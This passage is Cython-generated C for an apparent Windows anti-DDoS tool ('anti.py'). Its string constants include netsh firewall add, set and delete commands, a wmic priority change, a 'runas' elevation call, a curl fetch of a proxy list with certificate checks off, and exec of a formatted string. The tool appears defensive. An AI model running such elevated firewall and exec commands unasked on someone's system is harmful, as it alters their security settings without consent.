#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject** type, PyObject** value, PyObject** tb);
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
    PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
    PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
    int has_cstart, int has_cstop, int wraparound);
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);
static CYTHON_INLINE int __Pyx_IterFinish(void);
static int __Pyx_IternextUnpackEndCheck(PyObject* retval, Py_ssize_t expected);
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject* op1, PyObject* op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetItem(PyObject* obj, PyObject* key);
#else
#define __Pyx_PyObject_GetItem(obj, key)  PyObject_GetItem(obj, key)
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif
#if CYTHON_COMPILING_IN_PYPY
#define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
#define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
#define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
    Py_UCS4 max_char);
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*)list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif
static int __Pyx_PyObject_GetMethod(PyObject* obj, PyObject* name, PyObject** method);
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject* func_weakreflist;
#endif
    PyObject* func_dict;
    PyObject* func_name;
    PyObject* func_qualname;
    PyObject* func_doc;
    PyObject* func_globals;
    PyObject* func_code;
    PyObject* func_closure;
    PyObject* func_classobj;
    void* defaults;
    int defaults_pyobjects;
    size_t defaults_size;
    int flags;
    PyObject* defaults_tuple;
    PyObject* defaults_kwdict;
    PyObject* (*defaults_getter)(PyObject*);
    PyObject* func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject* __pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject* __Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef* ml,
    int flags, PyObject* qualname,
    PyObject* self,
    PyObject* module, PyObject* globals,
    PyObject* code);
static CYTHON_INLINE void* __Pyx_CyFunction_InitDefaults(PyObject* m,
    size_t size,
    int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject* m,
    PyObject* tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject* m,
    PyObject* dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject* m,
    PyObject* dict);
static int __pyx_CyFunction_init(void);
static PyObject* __Pyx_CyFunction_New(PyMethodDef* ml,
    int flags, PyObject* qualname,
    PyObject* closure,
    PyObject* module, PyObject* globals,
    PyObject* code);
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);
static CYTHON_INLINE PyObject* __Pyx_PyInt_NeObjC(PyObject* op1, PyObject* op2, long intval, long inplace);
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*)list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len)) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)
#endif
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject* op1, PyObject* op2, long intval, long inplace);
static PyObject* __Pyx_Globals(void);
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);
static PyObject* __Pyx_PyExecGlobals(PyObject*);
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState* tstate, int c_line);
#endif
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = { 0,0,NULL };
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject* __pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);
static void __Pyx_AddTraceback(const char* funcname, int c_line,
    int py_line, const char* filename);
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject*);
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject*);
static CYTHON_INLINE int __Pyx_StrEq(const char*, const char*);
static int __Pyx_check_binary_version(void);
static int __Pyx_InitStrings(__Pyx_StringTabEntry* t);
static PyObject* __pyx_7genexpr__pyx_v_4anti_x;
static PyObject* __pyx_8genexpr1__pyx_v_4anti_x;
static PyObject* __pyx_8genexpr2__pyx_v_4anti_x;
static PyObject* __pyx_8genexpr3__pyx_v_4anti_x;
#define __Pyx_MODULE_NAME "anti"
extern int __pyx_module_is_main_anti;
int __pyx_module_is_main_anti = 0;
static PyObject* __pyx_builtin_input;
static PyObject* __pyx_builtin_print;
static PyObject* __pyx_builtin_ImportError;
static PyObject* __pyx_builtin_open;
static PyObject* __pyx_builtin_KeyboardInterrupt;
static PyObject* __pyx_builtin_KeyError;
static PyObject* __pyx_builtin_OSError;
static const char __pyx_k_0[] = "0";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_N[] = "N";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_b[] = "b";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_f[] = "f";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_n[] = "n";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_32[] = "/32";
static const char __pyx_k_No[] = "No";
static const char __pyx_k__2[] = " ";
static const char __pyx_k__3[] = ",";
static const char __pyx_k__5[] = ",{},\n";
static const char __pyx_k__7[] = "";
static const char __pyx_k__8[] = "~//";
static const char __pyx_k__9[] = "\\";
static const char __pyx_k_ip[] = "ip";
static const char __pyx_k_nt[] = "nt";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_wb[] = "wb";
static const char __pyx_k_0_2[] = ",{0}";
static const char __pyx_k_GET[] = "GET: {}";
static const char __pyx_k__10[] = "~/";
static const char __pyx_k__11[] = "/";
static const char __pyx_k__13[] = "\r";
static const char __pyx_k__15[] = "\n";
static const char __pyx_k__16[] = "\r\n";
static const char __pyx_k__19[] = " -> ";
static const char __pyx_k__20[] = " (";
static const char __pyx_k__21[] = ")";
static const char __pyx_k__22[] = " | ";
static const char __pyx_k__38[] = "_";
static const char __pyx_k__53[] = "*";
static const char __pyx_k__55[] = ".";
static const char __pyx_k__62[] = "\"";
static const char __pyx_k__63[] = ":";
static const char __pyx_k_cls[] = "cls";
static const char __pyx_k_end[] = "end";
static const char __pyx_k_pid[] = "pid";
static const char __pyx_k_soc[] = "soc";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_DIED[] = "(DIED)";
static const char __pyx_k_PIPE[] = "PIPE";
static const char __pyx_k_Port[] = ". Port ";
static const char __pyx_k_anti[] = "anti";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_argv[] = "argv";
static const char __pyx_k_bind[] = "bind";
static const char __pyx_k_conn[] = "conn";
static const char __pyx_k_ddos[] = "ddos";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_kill[] = "kill";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_port[] = "port";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_recv[] = "recv";
static const char __pyx_k_sock[] = "sock";
static const char __pyx_k_temp[] = "temp";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_2_NUL[] = " 2>NUL";
static const char __pyx_k_OK_IP[] = "(OK - {} IP)";
static const char __pyx_k_Popen[] = "Popen";
static const char __pyx_k_about[] = "about";
static const char __pyx_k_ascii[] = "ascii";
static const char __pyx_k_block[] = "block";
static const char __pyx_k_br_br[] = "<br></br>";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_count[] = "count";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_khanh[] = "khanh";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_runas[] = "runas";
static const char __pyx_k_shell[] = "shell";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_start[] = "start";
static const char __pyx_k_stdin[] = "stdin";
static const char __pyx_k_utf_8[] = "utf-8";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_Accept[] = " | Accept: ";
static const char __pyx_k_Thread[] = "Thread";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_ban_ip[] = "ban_ip";
static const char __pyx_k_blockk[] = "blockk";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_con_ip[] = "con_ip";
static const char __pyx_k_config[] = "config";
static const char __pyx_k_ctypes[] = "ctypes";
static const char __pyx_k_decode[] = "decode";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_format[] = "format";
static const char __pyx_k_get_fb[] = "get_fb";
static const char __pyx_k_getpid[] = "getpid";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_listen[] = "listen";
static const char __pyx_k_name_2[] = "name";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_signal[] = "signal";
static const char __pyx_k_socket[] = "socket";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_string[] = "string";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_target[] = "target";
static const char __pyx_k_windll[] = "windll";
static const char __pyx_k_AF_INET[] = "AF_INET";
static const char __pyx_k_DEVNULL[] = "DEVNULL";
static const char __pyx_k_OSError[] = "OSError";
static const char __pyx_k_SHUT_RD[] = "SHUT_RD";
static const char __pyx_k_SHUT_WR[] = "SHUT_WR";
static const char __pyx_k_SIGABRT[] = "SIGABRT";
static const char __pyx_k_SIGKILL[] = "SIGKILL";
static const char __pyx_k_anti_py[] = "anti.py";
static const char __pyx_k_connect[] = "connect";
static const char __pyx_k_devnull[] = "devnull";
static const char __pyx_k_forward[] = "forward";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_payload[] = "payload";
static const char __pyx_k_replace[] = "replace";
static const char __pyx_k_request[] = "request";
static const char __pyx_k_sendall[] = "sendall";
static const char __pyx_k_shell32[] = "shell32";
static const char __pyx_k_timeout[] = "timeout";
static const char __pyx_k_unquote[] = "unquote";
static const char __pyx_k_KeyError[] = "KeyError";
static const char __pyx_k_ban_sock[] = "ban_sock";
static const char __pyx_k_block_ip[] = "block_ip";
static const char __pyx_k_blockk_2[] = "blockk={}";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_count_ip[] = "count_ip";
static const char __pyx_k_exec_sys[] = "exec_sys";
static const char __pyx_k_is_admin[] = "is_admin";
static const char __pyx_k_shutdown[] = "shutdown";
static const char __pyx_k_total_ip[] = "total_ip";
static const char __pyx_k_host_fake[] = "host_fake";
static const char __pyx_k_host_real[] = "host_real";
static const char __pyx_k_open_port[] = "open_port";
static const char __pyx_k_port_fake[] = "port_fake";
static const char __pyx_k_port_real[] = "port_real";
static const char __pyx_k_proxy_txt[] = "proxy.txt";
static const char __pyx_k_threading[] = "threading";
static const char __pyx_k_ERROR_Port[] = "ERROR: Port ";
static const char __pyx_k_executable[] = "executable";
static const char __pyx_k_subprocess[] = "subprocess";
static const char __pyx_k_ImportError[] = "ImportError";
static const char __pyx_k_SOCK_STREAM[] = "SOCK_STREAM";
static const char __pyx_k_Your_choose[] = ">> Your choose: ";
static const char __pyx_k_add_ip_rule[] = "add_ip_rule";
static const char __pyx_k_create_rule[] = "create_rule";
static const char __pyx_k_destination[] = "destination";
static const char __pyx_k_force_block[] = "force_block";
static const char __pyx_k_is_get_sock[] = "is_get_sock";
static const char __pyx_k_list_ban_ip[] = "list_ban_ip";
static const char __pyx_k_TimeoutError[] = "TimeoutError";
static const char __pyx_k_block_ip_txt[] = "block_ip.txt";
static const char __pyx_k_check_output[] = "check_output";
static const char __pyx_k_kill_process[] = "kill_process";
static const char __pyx_k_remove_block[] = "remove_block";
static const char __pyx_k_time_connect[] = "time_connect";
static const char __pyx_k_urllib_parse[] = "urllib.parse";
static const char __pyx_k_IsUserAnAdmin[] = "IsUserAnAdmin";
static const char __pyx_k_Processing_IP[] = "Processing IP....";
static const char __pyx_k_ShellExecuteW[] = "ShellExecuteW";
static const char __pyx_k_global_blockk[] = "global blockk; {}";
static const char __pyx_k_reset_on_time[] = "reset_on_time";
static const char __pyx_k_server_socket[] = "server_socket";
static const char __pyx_k_Content_Length[] = "Content-Length: ";
static const char __pyx_k_block_on_count[] = "block_on_count";
static const char __pyx_k_content_length[] = "content_length";
static const char __pyx_k_Closing_process[] = "\nClosing process....";
static const char __pyx_k_KhanhNguyen9872[] = "KhanhNguyen9872";
static const char __pyx_k_PermissionError[] = "PermissionError";
static const char __pyx_k_Real_IP_Sock_IP[] = "Real IP Sock: {} IP";
static const char __pyx_k_Total_IP_Sock_IP[] = "\nTotal IP Sock: {} IP";
static const char __pyx_k_KeyboardInterrupt[] = "KeyboardInterrupt";
static const char __pyx_k_Timeout_Port_from[] = ">> Timeout: Port {} from {}";
static const char __pyx_k_CalledProcessError[] = "CalledProcessError";
static const char __pyx_k_Starting_Anti_DDOS[] = ">> Starting Anti-DDOS...";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_Press_Enter_to_Exit[] = "Press Enter to Exit!";
static const char __pyx_k_config_fake_0_1_2_3[] = "\nconfig fake: {0}:{1} -> {2}:{3}";
static const char __pyx_k_Config_file_is_error[] = "\n>> Config file is error!";
static const char __pyx_k_ConnectionResetError[] = "ConnectionResetError";
static const char __pyx_k_Input_Facebook_Admin[] = "Input Facebook Admin: ";
static const char __pyx_k_Press_Enter_to_Start[] = "Press Enter to Start!";
static const char __pyx_k_force_firewall_count[] = "force_firewall_count";
static const char __pyx_k_Press_Enter_to_Exit_2[] = ">> Press Enter to Exit!";
static const char __pyx_k_https_fb_me_khanh10a1[] = "https://fb.me/khanh10a1";
static const char __pyx_k_ConnectionAbortedError[] = "ConnectionAbortedError";
static const char __pyx_k_ConnectionRefusedError[] = "ConnectionRefusedError";
static const char __pyx_k_Downloading_Sock_Proxy[] = "Downloading Sock Proxy....";
static const char __pyx_k_Facebook_Admin_is_error[] = ">> Facebook Admin is error!";
static const char __pyx_k_Started_KhanhNguyen9872[] = ">> Started! (KhanhNguyen9872)";
static const char __pyx_k_Blocked_connection_from_0[] = "Blocked connection from {0}";
static const char __pyx_k_Close_connection_Port_from[] = ">> Close connection: Port {} from {}";
static const char __pyx_k_Blocked_connection_from_0_1[] = "Blocked connection from {0} ({1})";
static const char __pyx_k_Detected_DDOS_from_Blocking[] = "!! Detected DDOS from {}! Blocking...";
static const char __pyx_k_start_https_fb_me_khanh10a1[] = "start \"\" \"https://fb.me/khanh10a1\"";
static const char __pyx_k_Aborted_connection_Port_from[] = ">> Aborted connection: Port {} from {}";
static const char __pyx_k_Connection_refused_Port_from[] = ">> Connection refused: Port {} from {}";
static const char __pyx_k_Detected_0_try_request_1_times[] = "!! Detected {0} try request {1} times! Blocking...";
static const char __pyx_k_No_DDOS_in_seconds_reset_count[] = "No DDOS in {} seconds, reset count...";
static const char __pyx_k_This_tool_work_only_on_Windows[] = "\n>> This tool work only on Windows!\n";
static const char __pyx_k_1_Anti_DDOS_Fake_Port_0_2_Remov[] = "\n1. Anti-DDOS [Fake Port {0}]\n2. Remove All Block IP [Port {0}]\n3. About\n0. Exit\n\n";
static const char __pyx_k_Found_proxy_txt_Note_Y_for_load[] = "Found: proxy.txt\nNote: Y for load proxy, N for download new sock proxy\n>> Do you want to load proxy from this file? [Y/N]: ";
static const char __pyx_k_NOTE_Y_for_save_to_file_N_for_s[] = "\nNOTE: Y for save to file, N for skip save\n>> Do you want to save Real IP? [Y/N]: ";
static const char __pyx_k_cannot_be_spoof_Need_administra[] = " cannot be spoof! Need administrator permission!!";
static const char __pyx_k_config_py_not_found_or_syntax_e[] = ">> config.py not found or syntax error!";
static const char __pyx_k_curl_exe_H_User_Agent_1_k_L_max[] = ".\\curl.exe -H \"User-Agent: {1}\" -k -L --max-redirs 20 --silent --connect-timeout 15 \"{0}\"";
static const char __pyx_k_netsh_advfirewall_firewall_show[] = "netsh advfirewall firewall show rule name=\"Khanh {0}\"";
static const char __pyx_k_Are_you_sure_to_remove_all_block[] = "Are you sure to remove all block IP? [Y/N]: ";
static const char __pyx_k_HTTP_1_0_200_OK_Content_Type_tex[] = "HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n";
static const char __pyx_k_KhanhNguyen9872_1_Facebook_2_You[] = "KhanhNguyen9872\n\n1. Facebook\n2. Youtube\n3. Github\n0. Back\n\n Your choose: ";
static const char __pyx_k_Remove_All_Block_IP_from_Port_co[] = "Remove All Block IP from [Port {}] completed!\n";
static const char __pyx_k_netsh_advfirewall_firewall_add_r[] = "netsh advfirewall firewall add rule name= \"Khanh {0}\" dir=in action=block profile=any protocol=TCP localport={0} localip=any remoteip=\"{1}\"";
static const char __pyx_k_netsh_advfirewall_firewall_delet[] = "netsh advfirewall firewall delete rule name=\"Khanh {}\" dir=in";
static const char __pyx_k_netsh_advfirewall_firewall_set_r[] = "netsh advfirewall firewall set rule name=\"Khanh {0}\" new remoteip=\"{1}\"";
static const char __pyx_k_start_https_github_com_KhanhNguy[] = "start \"\" \"https://github.com/KhanhNguyen9872\"";
static const char __pyx_k_start_https_youtube_com_KhanhNgu[] = "start \"\" \"https://youtube.com/@KhanhNguyen9872_Official_v2\"";
static const char __pyx_k_title_Anti_DDOS_using_Python3_Kh[] = "title Anti-DDOS using Python3 (KhanhNguyen9872)";
static const char __pyx_k_wmic_process_where_name_Anti_DDO[] = "wmic process where name=\"Anti-DDOS.exe\" CALL setpriority 256 > NUL 2>&1";
static const char __pyx_k_netsh_advfirewall_firewall_set_r_2[] = "netsh advfirewall firewall set rule name=\"Khanh {0}\" new enable=yes";
static PyObject* __pyx_kp_u_0;
static PyObject* __pyx_kp_u_0_2;
static PyObject* __pyx_kp_u_1;
static PyObject* __pyx_kp_u_1_Anti_DDOS_Fake_Port_0_2_Remov;
static PyObject* __pyx_kp_u_2;
static PyObject* __pyx_kp_u_2_NUL;
static PyObject* __pyx_kp_u_3;
static PyObject* __pyx_kp_u_32;
static PyObject* __pyx_n_s_AF_INET;
static PyObject* __pyx_kp_u_Aborted_connection_Port_from;
static PyObject* __pyx_kp_u_Accept;
static PyObject* __pyx_kp_u_Are_you_sure_to_remove_all_block;
static PyObject* __pyx_kp_u_Blocked_connection_from_0;
static PyObject* __pyx_kp_u_Blocked_connection_from_0_1;
static PyObject* __pyx_n_s_CalledProcessError;
static PyObject* __pyx_kp_u_Close_connection_Port_from;
static PyObject* __pyx_kp_u_Closing_process;
static PyObject* __pyx_kp_u_Config_file_is_error;
static PyObject* __pyx_n_s_ConnectionAbortedError;
static PyObject* __pyx_n_s_ConnectionRefusedError;
static PyObject* __pyx_n_s_ConnectionResetError;
static PyObject* __pyx_kp_u_Connection_refused_Port_from;
static PyObject* __pyx_kp_b_Content_Length;
static PyObject* __pyx_n_s_DEVNULL;
static PyObject* __pyx_kp_u_DIED;
static PyObject* __pyx_kp_u_Detected_0_try_request_1_times;
static PyObject* __pyx_kp_u_Detected_DDOS_from_Blocking;
static PyObject* __pyx_kp_u_Downloading_Sock_Proxy;
static PyObject* __pyx_kp_u_ERROR_Port;
static PyObject* __pyx_kp_u_Facebook_Admin_is_error;
static PyObject* __pyx_kp_u_Found_proxy_txt_Note_Y_for_load;
static PyObject* __pyx_kp_u_GET;
static PyObject* __pyx_kp_b_HTTP_1_0_200_OK_Content_Type_tex;
static PyObject* __pyx_n_s_ImportError;
static PyObject* __pyx_kp_u_Input_Facebook_Admin;
static PyObject* __pyx_n_s_IsUserAnAdmin;
static PyObject* __pyx_n_s_KeyError;
static PyObject* __pyx_n_s_KeyboardInterrupt;
static PyObject* __pyx_n_u_KhanhNguyen9872;
static PyObject* __pyx_kp_u_KhanhNguyen9872_1_Facebook_2_You;
static PyObject* __pyx_n_u_N;
static PyObject* __pyx_kp_u_NOTE_Y_for_save_to_file_N_for_s;
static PyObject* __pyx_n_u_No;
static PyObject* __pyx_kp_u_No_DDOS_in_seconds_reset_count;
static PyObject* __pyx_kp_u_OK_IP;
static PyObject* __pyx_n_s_OSError;
static PyObject* __pyx_n_s_PIPE;
static PyObject* __pyx_n_s_PermissionError;
static PyObject* __pyx_n_s_Popen;
static PyObject* __pyx_kp_u_Port;
static PyObject* __pyx_kp_u_Press_Enter_to_Exit;
static PyObject* __pyx_kp_u_Press_Enter_to_Exit_2;
static PyObject* __pyx_kp_u_Press_Enter_to_Start;
static PyObject* __pyx_kp_u_Processing_IP;
static PyObject* __pyx_kp_u_Real_IP_Sock_IP;
static PyObject* __pyx_kp_u_Remove_All_Block_IP_from_Port_co;
static PyObject* __pyx_n_s_SHUT_RD;
static PyObject* __pyx_n_s_SHUT_WR;
static PyObject* __pyx_n_s_SIGABRT;
static PyObject* __pyx_n_s_SIGKILL;
static PyObject* __pyx_n_u_SIGKILL;
static PyObject* __pyx_n_s_SOCK_STREAM;
static PyObject* __pyx_n_s_ShellExecuteW;
static PyObject* __pyx_kp_u_Started_KhanhNguyen9872;
static PyObject* __pyx_kp_u_Starting_Anti_DDOS;
static PyObject* __pyx_kp_u_This_tool_work_only_on_Windows;
static PyObject* __pyx_n_s_Thread;
static PyObject* __pyx_n_s_TimeoutError;
static PyObject* __pyx_kp_u_Timeout_Port_from;
static PyObject* __pyx_kp_u_Total_IP_Sock_IP;
static PyObject* __pyx_n_u_Y;
static PyObject* __pyx_kp_u_Your_choose;
static PyObject* __pyx_kp_u__10;
static PyObject* __pyx_kp_u__11;
static PyObject* __pyx_kp_u__13;
static PyObject* __pyx_kp_u__15;
static PyObject* __pyx_kp_b__16;
static PyObject* __pyx_kp_u__16;
static PyObject* __pyx_kp_u__19;
static PyObject* __pyx_kp_u__2;
static PyObject* __pyx_kp_u__20;
static PyObject* __pyx_kp_u__21;
static PyObject* __pyx_kp_u__22;
static PyObject* __pyx_kp_u__3;
static PyObject* __pyx_n_s__38;
static PyObject* __pyx_kp_u__5;
static PyObject* __pyx_n_s__53;
static PyObject* __pyx_kp_u__55;
static PyObject* __pyx_kp_u__62;
static PyObject* __pyx_kp_u__63;
static PyObject* __pyx_kp_u__7;
static PyObject* __pyx_kp_u__8;
static PyObject* __pyx_kp_u__9;
static PyObject* __pyx_n_s_a;
static PyObject* __pyx_n_u_a;
static PyObject* __pyx_n_s_about;
static PyObject* __pyx_n_s_accept;
static PyObject* __pyx_n_s_add_ip_rule;
static PyObject* __pyx_n_s_anti;
static PyObject* __pyx_kp_s_anti_py;
static PyObject* __pyx_n_s_append;
static PyObject* __pyx_n_s_args;
static PyObject* __pyx_n_s_argv;
static PyObject* __pyx_n_u_ascii;
static PyObject* __pyx_n_s_b;
static PyObject* __pyx_n_s_ban_ip;
static PyObject* __pyx_n_s_ban_sock;
static PyObject* __pyx_n_s_bind;
static PyObject* __pyx_n_s_block;
static PyObject* __pyx_n_s_block_ip;
static PyObject* __pyx_kp_u_block_ip_txt;
static PyObject* __pyx_n_s_block_on_count;
static PyObject* __pyx_n_s_blockk;
static PyObject* __pyx_kp_u_blockk_2;
static PyObject* __pyx_kp_u_br_br;
static PyObject* __pyx_n_s_builtins;
static PyObject* __pyx_kp_u_cannot_be_spoof_Need_administra;
static PyObject* __pyx_n_s_check_output;
static PyObject* __pyx_n_s_choice;
static PyObject* __pyx_n_s_clear;
static PyObject* __pyx_n_s_cline_in_traceback;
static PyObject* __pyx_n_s_close;
static PyObject* __pyx_n_u_cls;
static PyObject* __pyx_n_s_con_ip;
static PyObject* __pyx_n_s_config;
static PyObject* __pyx_kp_u_config_fake_0_1_2_3;
static PyObject* __pyx_kp_u_config_py_not_found_or_syntax_e;
static PyObject* __pyx_n_s_conn;
static PyObject* __pyx_n_s_connect;
static PyObject* __pyx_n_s_content_length;
static PyObject* __pyx_n_s_count;
static PyObject* __pyx_n_s_count_ip;
static PyObject* __pyx_n_s_create_rule;
static PyObject* __pyx_n_s_ctypes;
static PyObject* __pyx_kp_u_curl_exe_H_User_Agent_1_k_L_max;
static PyObject* __pyx_n_s_ddos;
static PyObject* __pyx_n_s_decode;
static PyObject* __pyx_n_s_destination;
static PyObject* __pyx_n_s_devnull;
static PyObject* __pyx_n_s_e;
static PyObject* __pyx_n_s_end;
static PyObject* __pyx_n_s_enter;
static PyObject* __pyx_n_s_exec_sys;
static PyObject* __pyx_n_s_executable;
